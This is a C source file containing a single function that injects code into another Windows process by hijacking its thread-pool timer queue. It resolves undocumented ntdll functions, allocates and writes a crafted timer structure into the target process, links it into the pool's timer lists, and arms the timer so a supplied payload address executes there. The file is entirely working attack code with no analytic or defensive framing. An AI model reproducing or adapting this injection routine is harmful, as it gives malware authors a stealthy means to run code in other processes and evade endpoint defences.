#include "structs.h"
#include "typedefs.h"
#include "common.h"

BOOL InjectViaTpTimer(HANDLE hWorkerFactory, HANDLE hTimer, PVOID payloadAddress, HANDLE targetProcess) {

	WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };
	PFULL_TP_TIMER remoteTpTimer = NULL;
	fnNtQueryInformationWorkerFactory pQueryWorkerFactory = NULL;
	PFULL_TP_TIMER pFullTpTimer = NULL;
	signed long long int timeOutInterval = -10000000;
	LARGE_INTEGER dueTime = { 0 };
	fnNtSetTimer2 pNtSetTimer2 = NULL;
	NTSTATUS status = ERROR_SUCCESS;

	pNtSetTimer2 = (fnNtSetTimer2)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetTimer2"));
	pQueryWorkerFactory = (fnNtQueryInformationWorkerFactory)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationWorkerFactory"));

	if (pQueryWorkerFactory == NULL || pNtSetTimer2 == NULL) {
		return FALSE;
	}

	status = pQueryWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL);
	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	pFullTpTimer = (PFULL_TP_TIMER)(CreateThreadpoolTimer((PTP_TIMER_CALLBACK)payloadAddress, NULL, NULL));
	if (pFullTpTimer == NULL) {
		return FALSE;
	}

	remoteTpTimer = (PFULL_TP_TIMER)(VirtualAllocEx(targetProcess, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (remoteTpTimer == NULL) {
		return FALSE;
	}

	pFullTpTimer->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)(workerFactoryInfo.StartParameter);
	pFullTpTimer->DueTime = timeOutInterval;

	pFullTpTimer->WindowEndLinks.Key = timeOutInterval;
	pFullTpTimer->WindowStartLinks.Key = timeOutInterval;

	pFullTpTimer->WindowStartLinks.Children.Flink = &remoteTpTimer->WindowStartLinks.Children;
	pFullTpTimer->WindowStartLinks.Children.Blink = &remoteTpTimer->WindowStartLinks.Children;

	pFullTpTimer->WindowEndLinks.Children.Flink = &remoteTpTimer->WindowEndLinks.Children;
	pFullTpTimer->WindowEndLinks.Children.Blink = &remoteTpTimer->WindowEndLinks.Children;


	if (!WriteProcessMemory(targetProcess, remoteTpTimer, pFullTpTimer, sizeof(FULL_TP_TIMER), NULL)) {
		return FALSE;
	}

	PVOID pTpTimerWindowStartLinks = &remoteTpTimer->WindowStartLinks;

	if (!WriteProcessMemory(targetProcess, &pFullTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, (PVOID)(&pTpTimerWindowStartLinks), sizeof(pTpTimerWindowStartLinks), NULL)) {
		return FALSE;
	}

	PVOID pTpTimerWindowEndLinks = &remoteTpTimer->WindowEndLinks;

	if (!WriteProcessMemory(targetProcess, &pFullTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, (PVOID)(&pTpTimerWindowEndLinks), sizeof(pTpTimerWindowEndLinks), NULL)) {
		return FALSE;
	}

	dueTime.QuadPart = timeOutInterval;
	T2_SET_PARAMETERS timerParameters = { 0 };

	status = pNtSetTimer2(hTimer, &dueTime, NULL, &timerParameters);
	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	return TRUE;
}
